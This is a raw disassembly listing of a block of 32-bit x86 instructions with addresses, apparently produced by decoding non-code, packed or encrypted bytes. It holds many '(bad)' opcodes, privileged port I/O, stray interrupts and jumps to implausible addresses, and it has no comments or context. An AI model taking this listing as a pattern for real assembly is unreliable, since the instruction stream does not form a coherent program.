  40d74b:	mov    WORD PTR [eax],cs
  40d74d:	or     al,0xba
  40d74f:	push   esi
  40d750:	jae    0x40d710
  40d752:	popa   
  40d753:	mov    BYTE PTR [esi],al
  40d755:	adc    ecx,DWORD PTR [ecx+0x5c]
  40d758:	je     0x40d76d
  40d75a:	jge    0x40d7c2
  40d75c:	iret   
  40d75d:	rcl    DWORD PTR [ebx+0x6b],0xf0
  40d761:	imul   esp,DWORD PTR [ebp+0x8f30043],0x39074f4c
  40d76b:	scas   al,BYTE PTR es:[edi]
  40d76c:	outs   dx,DWORD PTR ds:[esi]
  40d76d:	test   DWORD PTR [edx+0x76d1c16a],ebp
  40d773:	js     0x40d7e8
  40d775:	fmul   DWORD PTR [edx-0x3e]
  40d778:	fld    QWORD PTR [eax-0x51e889fd]
  40d77e:	mov    edx,0x7f33f836
  40d783:	outs   dx,DWORD PTR ds:[esi]
  40d784:	ss push ebx
  40d786:	ins    DWORD PTR es:[edi],dx
  40d787:	pushf  
  40d788:	push   ebx
  40d789:	sub    cl,0x26
  40d78c:	shl    DWORD PTR [eax],1
  40d78e:	mov    esi,0xfdc39482
  40d793:	rol    BYTE PTR [edi-0x5cd1228c],0xc0
  40d79a:	(bad)  
  40d79b:	gs dec esp
  40d79d:	inc    esp
  40d79e:	and    eax,0xa38de30e
  40d7a3:	ror    BYTE PTR [ebp+ebx*8-0x29],0x1c
  40d7a8:	loopne 0x40d81e
  40d7aa:	test   DWORD PTR [edx+0x1c5de3db],esp
  40d7b0:	stos   DWORD PTR es:[edi],eax
  40d7b1:	inc    edi
  40d7b2:	imul   edx
  40d7b4:	push   edx
  40d7b5:	fsub   QWORD PTR [esi]
  40d7b7:	idiv   BYTE PTR [ecx+eiz*4+0x64]
  40d7bb:	pusha  
  40d7bc:	in     al,0x6e
  40d7be:	or     BYTE PTR [ecx+ecx*1-0x3c],0x8b
  40d7c3:	xlat   BYTE PTR ds:[ebx]
  40d7c4:	enter  0x7223,0xf3
  40d7c8:	cmp    eax,DWORD PTR [ebp-0x4fc225fc]
  40d7ce:	push   edi
  40d7cf:	hlt    
  40d7d0:	mov    cl,BYTE PTR [esi]
  40d7d2:	int    0xfa
  40d7d4:	xchg   esp,eax
  40d7d5:	or     DWORD PTR [esi],0x3b3034cd
  40d7db:	outs   dx,DWORD PTR ds:[esi]
  40d7dc:	daa    
  40d7dd:	fst    DWORD PTR [eax]
  40d7df:	jmp    0x40d7be
  40d7e1:	loop   0x40d76d
  40d7e3:	mov    ebp,0xd75b5925
  40d7e8:	int    0x2e
  40d7ea:	out    0xd6,al
  40d7ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7ed:	fmul   DWORD PTR [eax+esi*2]
  40d7f0:	sub    eax,0x989dbdf4
  40d7f5:	add    BYTE PTR ds:0xa1317adb,al
  40d7fb:	imul   ecx,DWORD PTR [eax+0x7772c7ec],0xffffff92
  40d802:	jno    0x40d78e
  40d804:	add    esp,DWORD PTR [eax+0x4d41aed3]
  40d80a:	outs   dx,DWORD PTR ds:[esi]
  40d80b:	push   edi
  40d80c:	sub    BYTE PTR ds:0x6dd7,al
  40d811:	pop    ds
  40d812:	lds    edx,FWORD PTR [esi-0x11]
  40d815:	mov    eax,0x46ab692d
  40d81a:	xor    ah,dl
  40d81c:	mov    ds:0x2e6ce4c4,al
  40d821:	mov    ebp,0xb7ffe092
  40d826:	sbb    DWORD PTR [eax+ebx*8+0x2],eax
  40d82a:	cmp    eax,0x57c2b3f5
  40d82f:	imul   ebp,DWORD PTR [edx],0x4f
  40d832:	test   DWORD PTR [ecx+0x420b4a12],ecx
  40d838:	adc    BYTE PTR [ebx],0xac
  40d83b:	adc    BYTE PTR [edx+0x7f9cd669],bh
  40d841:	adc    al,0x65
  40d843:	mov    bl,0x8
  40d845:	dec    ebx
  40d846:	scas   eax,DWORD PTR es:[edi]
  40d847:	aaa    
  40d848:	fistp  QWORD PTR [eax+0x5d7845fc]
  40d84e:	inc    di
  40d850:	scas   eax,DWORD PTR es:[edi]
  40d851:	call   0xaf35cfa8
  40d856:	adc    DWORD PTR [ebx],0xffffff96
  40d859:	inc    eax
  40d85a:	and    ch,ch
  40d85c:	mov    dh,0xab
  40d85e:	sbb    eax,0xd5ec2b32
  40d863:	ror    DWORD PTR [ebx+0x66],1
  40d866:	sbb    al,0x88
  40d868:	jnp    0x40d85b
  40d86a:	lock adc al,BYTE PTR [eax-0x2b]
  40d86e:	mov    bh,0xad
  40d870:	das    
  40d871:	xor    ebp,DWORD PTR [edi-0x7fdeeac5]
  40d877:	stos   DWORD PTR es:[edi],eax
  40d878:	add    bl,BYTE PTR [ebp-0xe74a9ff]
  40d87e:	dec    edi
  40d87f:	cmp    DWORD PTR [edi+ecx*2+0x4d],0x85a7f90e
  40d887:	inc    edi
  40d888:	stos   DWORD PTR es:[edi],eax
  40d889:	call   ebx
  40d88b:	xor    ebx,ebx
  40d88d:	jmp    0x40d9eb
  40d892:	mul    BYTE PTR [ebx-0x6c]
  40d895:	jne    0x40d914
  40d897:	lds    edx,FWORD PTR [edi+0x51026b7d]
  40d89d:	mov    edx,DWORD PTR [ebp-0x3ddcb470]
  40d8a3:	cmp    DWORD PTR [esi+0x7e],0x7e7e7f3f
  40d8aa:	jle    0x40d8e4
  40d8ac:	leave  
  40d8ad:	ffreep st(7)
  40d8af:	dec    eax
  40d8b0:	pop    ebp
  40d8b1:	and    DWORD PTR cs:[edi+0x11c7d54e],esi
  40d8b8:	inc    ebp
  40d8b9:	xor    DWORD PTR [eax-0x37],0x1b
  40d8bd:	pop    es
  40d8be:	jne    0x40d863
  40d8c0:	jno    0x40d884
  40d8c2:	adc    DWORD PTR [edi],0x2e
  40d8c5:	pop    ecx
  40d8c6:	cmp    BYTE PTR [eax-0x80272d4],al
  40d8cc:	sbb    ah,dl
  40d8ce:	pop    ebx
  40d8cf:	xchg   ebx,eax
  40d8d0:	adc    BYTE PTR [edx],0x7e
  40d8d3:	addr16 pop es
  40d8d5:	int    0x93
  40d8d7:	inc    ebp
  40d8d8:	pop    eax
  40d8d9:	movd   mm5,DWORD PTR [bp+di+0x48]
  40d8de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8df:	leave  
  40d8e0:	or     bh,BYTE PTR [ebx-0x57]
  40d8e3:	xchg   ecx,eax
  40d8e4:	(bad)  
  40d8e5:	cli    
  40d8e6:	aad    0xb8
  40d8e8:	rep outs dx,DWORD PTR ds:[esi]
  40d8ea:	push   ebx
  40d8eb:	dec    ebx
  40d8ec:	pop    edi
  40d8ed:	in     al,0xa9
  40d8ef:	test   DWORD PTR [ecx+0x13df17aa],ecx
  40d8f5:	or     DWORD PTR [esi+0x6a],ebx
  40d8f8:	(bad)  
  40d8f9:	dec    esp
  40d8fa:	std    
  40d8fb:	scas   al,BYTE PTR es:[edi]
  40d8fc:	idiv   DWORD PTR [eax+0x62]
  40d8ff:	clc    
  40d900:	jmp    0x40d979
  40d902:	cli    
  40d903:	aaa    
  40d904:	mov    ah,0xd1
  40d906:	inc    edi
  40d907:	mov    ebx,0x2ed7cfd0
  40d90c:	xchg   esp,eax
  40d90d:	and    eax,DWORD PTR [ebp+0x11]
  40d910:	mov    WORD PTR [ebx],fs
  40d912:	jmp    0x26b7:0xe3ba28a7
  40d919:	mov    dl,0xb2
  40d91b:	mov    edi,0xe8bd294f
  40d920:	sbb    bh,al
  40d922:	push   esi
  40d923:	sbb    eax,0x725f666f
  40d928:	int3   
  40d929:	je     0x40d8b7
  40d92b:	stc    
  40d92c:	push   edx
  40d92d:	sahf   
  40d92e:	adc    bh,BYTE PTR [esi-0x4e68e814]
  40d934:	cmp    DWORD PTR [edx+0xce77ffd],ebx
  40d93a:	mov    DWORD PTR [esi],ebx
  40d93c:	mov    esi,0x3d9e5172
  40d941:	fwait
  40d942:	add    BYTE PTR [edx],dh
  40d944:	jle    0x40d91d
  40d946:	ret    
  40d947:	jmp    0x40d961
  40d949:	mov    ch,0xe8
  40d94b:	sbb    esi,DWORD PTR [ebp+0x7fc2d34f]
  40d951:	test   DWORD PTR [ebx-0x59],edi
  40d954:	inc    esp
  40d955:	hlt    
  40d956:	lds    esp,FWORD PTR [ebp-0x6acaaad6]
  40d95c:	push   ds
  40d95d:	jp     0x40d99f
  40d95f:	sbb    DWORD PTR [eax+esi*2],0x6a
  40d963:	pop    ebx
  40d964:	repz jmp 0xbd654488
  40d96a:	mov    cl,0x35
  40d96c:	jns    0x40d9bf
  40d96e:	sti    
  40d96f:	jno    0x40d9a9
  40d971:	(bad)  
  40d973:	test   ah,ah
  40d975:	outs   dx,BYTE PTR ds:[esi]
  40d976:	mov    ah,0xf
  40d978:	add    DWORD PTR [edi-0x6354c568],edx
  40d97e:	fstp   QWORD PTR [edi+0x2]
  40d981:	repz enter 0xeb04,0x32
  40d986:	(bad)  
  40d987:	es cdq 
  40d989:	lods   eax,DWORD PTR ds:[esi]
  40d98a:	mov    esi,0x6d54079a
  40d98f:	lock add eax,0x52d14514
  40d995:	ds enter 0xe59a,0x8b
  40d99a:	xchg   ebp,esi
  40d99c:	imul   eax,ebx,0x7e
  40d99f:	(bad)
  40d9a2:	jbe    0x40d95c
  40d9a4:	(bad)  
  40d9a5:	(bad)  
  40d9a6:	test   esp,0x820f5c6f
  40d9ac:	pop    edi
  40d9ad:	scas   eax,DWORD PTR es:[edi]
  40d9ae:	pop    ds
  40d9af:	inc    ebp
  40d9b0:	inc    esi
  40d9b1:	ds push ss
  40d9b3:	mov    ch,cl
  40d9b5:	xchg   ecx,eax
  40d9b6:	jp     0x40d947
  40d9b8:	inc    eax
  40d9b9:	out    dx,al
  40d9ba:	mov    dl,0xa6
  40d9bc:	adc    al,0x73
  40d9be:	push   ecx
  40d9bf:	or     al,0xb9
  40d9c1:	call   0x563f:0x72b82c79
  40d9c8:	out    dx,eax
  40d9c9:	or     eax,esi
  40d9cb:	out    dx,eax
  40d9cc:	push   0xffffff84
  40d9ce:	in     eax,0x76
  40d9d0:	sub    bl,bl
  40d9d2:	shr    BYTE PTR [eax-0x2f],0x23
  40d9d6:	cmp    BYTE PTR [ecx],dl
  40d9d8:	(bad)  
  40d9d9:	pop    esi
  40d9da:	xlat   BYTE PTR ds:[ebx]
  40d9db:	in     al,0x53
  40d9dd:	inc    edx
  40d9de:	sub    ch,BYTE PTR [ecx-0x6]
  40d9e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9e2:	push   cs
  40d9e3:	mul    BYTE PTR [ebp-0x29]
  40d9e6:	adc    ebx,DWORD PTR [ebp+0x43fd4413]
  40d9ec:	jmp    0x40db4a
  40d9f1:	jae    0x40d9e7
  40d9f3:	aas    
  40d9f4:	mov    DWORD PTR [ecx-0x6573b2b3],esi
  40d9fa:	cmp    BYTE PTR [edx+0x77],bl
  40d9fd:	push   edx
  40d9fe:	mov    esp,0x828329f4
  40da03:	jle    0x40da83
  40da05:	aas    
  40da06:	jg     0x40da86
  40da08:	jle    0x40da19
  40da0a:	es pop ds
  40da0c:	and    DWORD PTR [eax-0x7edb1589],ebp
  40da12:	and    al,0x97
  40da14:	ret    0xfe16
  40da17:	(bad)  
  40da18:	dec    edx
  40da19:	push   esi
  40da1a:	cmp    al,0x9
  40da1c:	mov    ch,0xbb
  40da1e:	int3   
  40da1f:	fwait
  40da20:	ror    DWORD PTR [edi+ebp*2+0x9],0x39
  40da25:	mov    ebp,0x540cb725
  40da2a:	ficomp DWORD PTR [ebx-0x7b37a591]
  40da30:	mov    esp,0x4f66bc0f
  40da35:	xchg   edx,eax
  40da36:	pop    ss
  40da37:	aaa    
  40da38:	enter  0xc94,0xb9
  40da3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da3d:	mov    dl,0xba
  40da3f:	dec    ecx
  40da40:	sub    ebp,DWORD PTR [edi+0x53]
  40da43:	xchg   esi,eax
  40da44:	xor    cl,dl
  40da46:	xchg   BYTE PTR [eax+0x18cf77e9],ch
  40da4c:	or     al,0xb0
  40da4e:	out    0x82,eax
  40da50:	add    ah,BYTE PTR [ebx+ecx*4+0x40]
  40da54:	sahf   
  40da55:	test   BYTE PTR [ebx],dl
  40da57:	das    
  40da58:	push   eax
  40da59:	or     eax,0x6d84f208
  40da5e:	stc    
  40da5f:	in     al,dx
  40da60:	cld    
  40da61:	lock int3 
  40da63:	jbe    0x40d9ed
  40da65:	les    ecx,FWORD PTR [esi-0x3c]
  40da68:	mov    eax,?
  40da6a:	xchg   ecx,eax
  40da6b:	data16 (bad) 
  40da6d:	mov    edi,cs
  40da6f:	mov    bl,0x4a
  40da71:	leave  
  40da72:	test   al,ch
  40da74:	pop    ds
  40da75:	ret    
  40da76:	add    dh,bl
  40da78:	inc    ecx
  40da79:	sbb    eax,0xf0276768
  40da7e:	cwde   
  40da7f:	popa   
  40da80:	xchg   edx,eax
  40da81:	loope  0x40dab0
  40da83:	sbb    al,0x6d
  40da85:	jae    0x40dac2
  40da87:	ss inc eax
  40da89:	fst    QWORD PTR ds:0x2c4c3ddf
  40da8f:	jl     0x40dabc
  40da91:	loop   0x40dac8
  40da93:	pop    es
  40da94:	fs dec esi
  40da96:	pop    ss
  40da97:	sub    eax,0x9d717cc5
  40da9c:	dec    eax
  40da9d:	jle    0x40db1e
  40da9f:	mov    ebp,0x4dbaf4d
  40daa4:	out    dx,al
  40daa5:	jo     0x40da67
  40daa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daa8:	cmp    DWORD PTR ds:0xd066c5b9,0xffffffac
  40daaf:	test   DWORD PTR [edi],eax
  40dab1:	neg    DWORD PTR [ecx]
  40dab3:	scas   al,BYTE PTR es:[edi]
  40dab4:	ins    DWORD PTR es:[edi],dx
  40dab5:	jae    0x40da95
  40dab7:	retf   0x6459
  40daba:	out    dx,al
  40dabb:	mov    gs,WORD PTR [edi+edx*4]
  40dabe:	jae    0x40daad
  40dac0:	clc    
  40dac1:	xor    al,0x18
  40dac3:	in     eax,dx
  40dac4:	icebp  
  40dac5:	arpl   WORD PTR [esi],di
  40dac7:	outs   dx,DWORD PTR ds:[esi]
  40dac8:	ret    0x7283
  40dacb:	jle    0x40dae8
  40dacd:	cmp    BYTE PTR [esi+eiz*1],0x11
  40dad1:	lods   eax,DWORD PTR ds:[esi]
  40dad2:	mov    ebx,0xa341331c
  40dad7:	bnd jne 0x40dac1
  40dada:	add    BYTE PTR [esi-0x61790df8],al
  40dae0:	pop    edi
  40dae1:	in     al,dx
  40dae2:	push   DWORD PTR [ecx+0x71e0886e]
  40dae8:	(bad)  
  40dae9:	es out dx,eax
  40daeb:	mov    es,WORD PTR [ebx+0x6b08eadf]
  40daf1:	push   esp
  40daf2:	cmp    ebx,DWORD PTR [edi-0x4e0a3a56]
  40daf8:	in     eax,0xce
  40dafa:	test   eax,0x813d056e
  40daff:	dec    esp
  40db00:	mov    edx,0x44833144
  40db05:	fisttp DWORD PTR [ecx-0x223396d9]
  40db0b:	daa    
  40db0c:	ja     0x40db25
  40db0e:	in     al,dx
  40db0f:	xor    BYTE PTR [ecx+ebx*2+0x18],ah
  40db13:	imul   edx,DWORD PTR [edx+0x1a],0x51330135
  40db1a:	sti    
  40db1b:	hlt    
  40db1c:	jecxz  0x40db31
  40db1e:	fcmovnu st,st(4)
  40db20:	cwde   
  40db21:	(bad)  
  40db22:	es xchg ebp,eax
  40db24:	retf   
  40db25:	test   al,0x19
  40db27:	ins    BYTE PTR es:[edi],dx
  40db28:	push   cs
  40db29:	cdq    
  40db2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db2b:	xor    eax,0x241a0309
  40db30:	aam    0x56
  40db32:	cmp    cl,BYTE PTR [edx+0x6899c6bb]
  40db38:	jmp    0xd86cbf73
  40db3d:	mov    BYTE PTR [ebp+0x26],0x5b
  40db41:	out    dx,al
  40db42:	in     al,0xb7
  40db44:	mov    ebx,0x891a7ada
  40db49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db4a:	cmp    DWORD PTR [ebp+0x10],ebx
  40db4d:	je     0x40df85
  40db53:	jmp    0x40dcb1
  40db58:	xchg   ebp,eax
  40db59:	mov    BYTE PTR [esi-0x42c354e4],bl
  40db5f:	mov    ecx,0xd105ab5
  40db64:	inc    esi
  40db65:	push   ss
  40db66:	pop    ebp
  40db67:	cmp    al,0x44
  40db69:	cmp    DWORD PTR [esi+0x7e],0x3f
  40db6d:	jg     0x40dbed
  40db6f:	jle    0x40dbb1
  40db71:	mov    ebp,0x8dacc7fb
  40db76:	push   ecx
  40db77:	mov    eax,0x5e188264
  40db7c:	(bad)  
  40db7d:	popa   
  40db7e:	ss xchg esi,eax
  40db80:	xchg   BYTE PTR [eax+0x44cfb8da],bl
  40db86:	and    eax,0xfbb661fc
  40db8b:	stos   DWORD PTR es:[edi],eax
  40db8c:	jo     0x40dbd4
  40db8e:	scas   eax,DWORD PTR es:[edi]
  40db8f:	jp     0x40db43
  40db91:	rcr    BYTE PTR [esi+0x25],cl
  40db94:	data16 clc 
  40db96:	jp     0x40db40
  40db98:	dec    esi
  40db99:	jns    0x40db26
  40db9b:	lock ins DWORD PTR es:[edi],dx
  40db9d:	xlat   BYTE PTR ds:[ebx]
  40db9e:	dec    edi
  40db9f:	lods   eax,DWORD PTR ds:[esi]
  40dba0:	add    dh,BYTE PTR ds:0x12a3535e
  40dba6:	xchg   esi,eax
  40dba7:	sar    BYTE PTR [esi],cl
  40dba9:	sub    bl,BYTE PTR [ebp+0x107258f8]
  40dbaf:	jne    0x40dc0b
  40dbb1:	xor    eax,0xf27e321
  40dbb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbb7:	cmp    cl,BYTE PTR [ebp+0x416dd061]
  40dbbd:	out    0x7,eax
  40dbbf:	imul   esp,DWORD PTR [esi],0x160608d4
  40dbc5:	int3   
  40dbc6:	or     ch,0x71
  40dbc9:	sub    al,0x3
  40dbcb:	cmc    
  40dbcc:	xchg   esp,eax
  40dbcd:	jbe    0x40db76
  40dbcf:	dec    edi
  40dbd0:	sbb    eax,0x15e4fe6d
  40dbd5:	pop    eax
  40dbd7:	lods   al,BYTE PTR ds:[esi]
  40dbd8:	ss xchg BYTE PTR ss:0x7d5ddb16,ah
  40dbe0:	adc    DWORD PTR [edi],esp
  40dbe2:	daa    
  40dbe3:	in     al,dx
  40dbe4:	mov    al,ds:0xef7a450a
  40dbe9:	add    al,0x6c
  40dbeb:	jecxz  0x40dc6b
  40dbed:	fstp   TBYTE PTR [ebx-0x45925ccf]
  40dbf3:	xlat   BYTE PTR ds:[ebx]
  40dbf4:	add    DWORD PTR [ebx-0x6bf893df],edx
  40dbfa:	iret   
  40dbfb:	loope  0x40dbfc
  40dbfd:	mov    dh,0x3d
  40dbff:	loop   0x40db93
  40dc01:	adc    BYTE PTR [eax],dh
  40dc03:	and    al,0x79
  40dc05:	jecxz  0x40dc41
  40dc07:	adc    ch,BYTE PTR [ebp+0x57]
  40dc0a:	push   es
  40dc0b:	dec    ebp
  40dc0c:	add    eax,0x6b7a5e82
  40dc11:	ds cmp ch,0x8c
  40dc15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc16:	cwde   
  40dc17:	repz cld 
  40dc19:	stos   DWORD PTR es:[edi],eax
  40dc1a:	add    eax,DWORD PTR [edi-0x28]
  40dc1d:	icebp  
  40dc1e:	mov    ebp,0x4b052cac
  40dc23:	arpl   WORD PTR [edi+0x30381a0a],bx
  40dc29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc2a:	and    eax,0xf284a80b
  40dc30:	jl     0x40dbd5
  40dc32:	stc    
  40dc33:	test   BYTE PTR [ebx-0x6908cce6],bl
  40dc39:	push   ecx
  40dc3a:	sbb    bh,BYTE PTR [ebp-0x45db284b]
  40dc40:	int3   
  40dc41:	enter  0x7f1b,0x95
  40dc45:	fincstp 
  40dc47:	fldcw  WORD PTR [ebp-0x37c8afd7]
  40dc4d:	add    al,0x17
  40dc4f:	mov    gs:0xa46c4903,eax
  40dc55:	(bad)  
  40dc56:	cmc    
  40dc57:	imul   edx,DWORD PTR [eax],0xe5021ce1
  40dc5d:	and    edx,DWORD PTR [esi-0x3f]
  40dc60:	pop    edi
  40dc61:	test   al,0x98
  40dc63:	jne    0x40dc59
  40dc65:	(bad)  
  40dc67:	mov    eax,ecx
  40dc69:	adc    eax,DWORD PTR [edi]
  40dc6b:	sbb    bl,BYTE PTR [eax-0x7b]
  40dc6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc6f:	push   ds
  40dc70:	lea    ebx,[eax+0x3f]
  40dc73:	dec    edx
  40dc74:	jo     0x40dca5
  40dc76:	in     eax,0x28
  40dc78:	cwde   
  40dc79:	(bad)  
  40dc7a:	jnp    0x40dc62
  40dc7c:	jnp    0x40dce7
  40dc7e:	cdq    
  40dc7f:	das    
  40dc80:	popf   
  40dc81:	in     eax,dx
  40dc82:	out    dx,eax
  40dc83:	lahf   
  40dc84:	out    0x60,eax
  40dc86:	js     0x40dce9
  40dc88:	in     eax,0xfc
  40dc8a:	pop    edi
  40dc8b:	sbb    esp,0x2f
  40dc8e:	cmp    DWORD PTR [esi+0x328dbc7a],0xffffffda
  40dc95:	dec    edx
  40dc96:	sub    DWORD PTR [ebx+0x1b],esp
  40dc99:	inc    edx
  40dc9a:	pop    esi
  40dc9b:	inc    esi
  40dc9c:	add    BYTE PTR [ecx+0x7cb59af4],al
  40dca2:	out    dx,al
  40dca3:	push   ebx
  40dca4:	test   eax,0xd0389825
  40dca9:	sub    al,0x22
  40dcab:	sub    al,0xc0
  40dcad:	sti    
  40dcae:	cwde   
  40dcaf:	mov    edx,0x59e9928b
  40dcb4:	add    DWORD PTR [eax],eax
  40dcb6:	add    BYTE PTR [eax+0x15],cl
  40dcb9:	sti    
  40dcba:	retf   0xdc7b
  40dcbd:	jns    0x40dc54
  40dcbf:	rcl    BYTE PTR ds:0x8e373fe9,cl
  40dcc5:	sub    esi,DWORD PTR [edi+0x7e7e8505]
  40dccb:	aas    
  40dccc:	jg     0x40dd4c
  40dcce:	jle    0x40dce2
  40dcd0:	ror    BYTE PTR [esi-0x73],cl
  40dcd3:	test   al,0xc5
  40dcd5:	mov    DWORD PTR [edx+eax*1+0x75358d6b],eax
  40dcdc:	fldcw  WORD PTR [ebx+0x67]
  40dcdf:	mul    BYTE PTR [esi-0x6021bc68]
  40dce5:	and    eax,0xf401357c
  40dcea:	in     al,0xd8
  40dcec:	xchg   esp,eax
  40dced:	adc    edi,edi
  40dcef:	cmp    edx,DWORD PTR [esi+0x50d90e33]
  40dcf5:	add    al,0xc1
  40dcf7:	in     eax,dx
  40dcf8:	dec    ebx
  40dcf9:	cmp    DWORD PTR [ebp-0xc],ebx
  40dcfc:	js     0x40dd7c
  40dcfe:	cld    
  40dcff:	lds    ebx,FWORD PTR [edi]
  40dd01:	sub    ebx,DWORD PTR [eax+0x5c]
  40dd04:	xchg   esp,eax
  40dd05:	dec    edx
  40dd06:	push   cs
  40dd07:	loopne 0x40dcb1
  40dd09:	(bad)  
  40dd0a:	jnp    0x40dd53
  40dd0c:	jae    0x40dd7a
  40dd0e:	cwde   
  40dd0f:	sbb    DWORD PTR [eax-0x4b],ebx
  40dd12:	lock cmp edi,edi
  40dd15:	adc    al,0xe1
  40dd17:	add    al,0x2e
  40dd19:	nop
  40dd1a:	mov    eax,ds:0x6e451426
  40dd1f:	mov    al,0xb1
  40dd21:	(bad)  
  40dd22:	aas    
  40dd23:	lock mov esi,0x84a613b9
  40dd29:	(bad)  
  40dd2a:	test   DWORD PTR [ebp-0x48a33126],eax
  40dd30:	mov    al,0x40
  40dd32:	push   ecx
  40dd33:	sbb    al,0xff
  40dd35:	fild   DWORD PTR [ecx+eax*2-0xe0720c5]
  40dd3c:	and    BYTE PTR [ecx-0x7a],ch
  40dd3f:	test   DWORD PTR [edi],0xa7110fc1
  40dd45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd46:	mov    esp,0xab86424
  40dd4b:	lods   eax,DWORD PTR ds:[esi]
  40dd4c:	retf   0xc049
  40dd4f:	shl    ecx,cl
  40dd51:	sbb    dl,ch
  40dd53:	sbb    esi,DWORD PTR [edx+0x30]
  40dd56:	jnp    0x40dd56
  40dd58:	mov    WORD PTR [esi-0x3a817db2],ds
  40dd5e:	div    DWORD PTR ds:0xd4827392
  40dd64:	xlat   BYTE PTR ds:[ebx]
  40dd65:	int    0x2c
  40dd67:	cmp    al,0xaf
  40dd69:	and    eax,0xfc4c3a22
  40dd6e:	mov    edi,0x2963292
  40dd73:	or     DWORD PTR [edi+0x58a2d6b0],esi
  40dd79:	xor    dh,BYTE PTR [edi-0x6a]
  40dd7c:	xor    BYTE PTR [ebx+edx*2+0x75],al
  40dd80:	sub    DWORD PTR [ebp-0x4824dcd6],ebx
  40dd86:	test   ax,0xe358
  40dd8a:	xchg   esp,eax
  40dd8b:	mov    al,ds:0x4d551c3c
  40dd90:	sbb    dl,cl
  40dd92:	fild   WORD PTR [edx+ecx*2+0x2aea6b37]
  40dd99:	and    al,0x32
  40dd9b:	xchg   edi,eax
  40dd9c:	mov    al,0xa3
  40dd9e:	mov    BYTE PTR [edi],ah
  40dda0:	je     0x40dd7a
  40dda2:	mov    al,ds:0x2620508d
  40dda7:	scas   eax,DWORD PTR es:[edi]
  40dda8:	dec    edi
  40dda9:	mov    ah,ah
  40ddab:	mov    al,ds:0xb21847cc
  40ddb0:	jns    0x40ddd6
  40ddb2:	clc    
  40ddb3:	sub    DWORD PTR [eax],esi
  40ddb5:	iret   
  40ddb6:	imul   esp,ebx,0xf7189ffc
  40ddbc:	lea    esi,[ebx-0x58d60b65]
  40ddc2:	popf   
  40ddc3:	repz cmp al,0xb6
  40ddc6:	pop    edi
  40ddc7:	das    
  40ddc8:	jge    0x40dd4a
  40ddca:	xor    edi,DWORD PTR [ebp-0x4a99509a]
  40ddd0:	pop    ebp
  40ddd1:	xor    eax,0xaa50c0c
  40ddd6:	mov    edx,0xd9aec2b9
  40dddb:	(bad)  
  40dddc:	call   0x1697dbbd
  40dde1:	or     BYTE PTR [esi+edi*2-0x367b2772],dl
  40dde8:	jae    0x40dd9c
  40ddea:	xor    al,0xa
  40ddec:	jmp    0x14ecbd32
  40ddf1:	mov    ds:0xf0044632,al
  40ddf6:	imul   DWORD PTR [ebp+0x55a2b50]
  40ddfc:	dec    edx
  40ddfd:	cmp    al,0x9c
  40ddff:	icebp  
  40de00:	cld    
  40de01:	add    al,0x19
  40de03:	adc    al,0xcf
  40de05:	call   0xa3cf:0x33369881
  40de0c:	cmp    DWORD PTR ds:0xa6aae1c,0x59
  40de13:	push   0x4
  40de15:	pop    ebx
  40de16:	inc    ebx
  40de17:	xchg   ebx,ecx
  40de19:	jmp    0x40df77
  40de1e:	ss test al,0xe0
  40de21:	or     eax,0x6dfb5d60
  40de26:	mov    al,0x7d
  40de28:	jmp    0x19f5be8d
  40de2d:	push   ebx
  40de2e:	mov    BYTE PTR [esi+0x7f3f7e7e],0x7e
  40de35:	jle    0x40deb2
  40de37:	mov    cl,0x5f
  40de39:	ja     0x40dead
  40de3b:	cmp    DWORD PTR [edi+0x52052e49],esi
  40de41:	sar    BYTE PTR [ecx],0x9f
  40de44:	(bad)  
  40de45:	pop    edi
  40de46:	cmp    DWORD PTR [ecx-0x2bbecc87],0x7a57385b
  40de50:	pop    ss
  40de51:	mov    esi,0x82a34d6
  40de56:	outs   dx,DWORD PTR ds:[esi]
  40de57:	int    0xd1
  40de59:	cmc    
  40de5a:	cmp    dh,bl
  40de5c:	int3   
  40de5d:	xchg   BYTE PTR [ebx-0x71],dh
  40de60:	inc    ebp
  40de61:	inc    ebx
  40de62:	jge    0x40deda
  40de64:	mov    ecx,0x86f95cf3
  40de69:	mov    al,ds:0xa572f6a4
  40de6e:	outs   dx,BYTE PTR ds:[esi]
  40de6f:	addr16 pushf 
  40de71:	js     0x40dee4
  40de73:	clc    
  40de74:	call   0x902e344d
  40de79:	sub    dl,BYTE PTR [ebp+0x2643adb2]
  40de7f:	je     0x40de11
  40de81:	aas    
  40de82:	or     al,0xca
  40de84:	cmp    ecx,DWORD PTR ds:0x6c955379
  40de8a:	inc    edi
  40de8b:	dec    BYTE PTR [edi+0x6232fd07]
  40de91:	mov    eax,ds:0x36ea13f8
  40de96:	shl    DWORD PTR [ebx+esi*2],1
  40de99:	ja     0x40de80
  40de9b:	and    edx,DWORD PTR [ebx]
  40de9d:	sti    
  40de9e:	cmp    eax,0xafc0682f
  40dea3:	adc    bh,bl
  40dea5:	jecxz  0x40df22
  40dea7:	(bad)  
  40dea9:	(bad)  
  40deaa:	xor    BYTE PTR [ebx-0x6e],ah
  40dead:	jnp    0x40de87
  40deaf:	adc    edx,edx
  40deb1:	ins    BYTE PTR es:[edi],dx
  40deb2:	pop    eax
  40deb3:	into   
  40deb4:	jmp    0xa7294480
  40deb9:	out    dx,al
  40deba:	jne    0x40dedf
  40debc:	call   0xde88c818
  40dec1:	shr    BYTE PTR [ecx-0x54b9371e],1
  40dec7:	dec    esp
  40dec8:	imul   edx,DWORD PTR [edx],0x39f00ccb
  40dece:	fisttp QWORD PTR [ebx-0x45]
  40ded1:	mov    esi,edx
  40ded3:	and    al,dh
  40ded5:	mov    edx,ebx
  40ded7:	add    DWORD PTR [edx],0x13d31c9
  40dedd:	dec    ecx
  40dede:	retf   0x5678
  40dee1:	repnz inc edi
  40dee3:	in     al,0xf
  40dee5:	cld    
  40dee6:	push   0xf096d095
  40deeb:	jb     0x40de8b
  40deed:	mov    ecx,0xd0647b4d
  40def2:	retf   0xb4d3
  40def5:	loope  0x40deb9
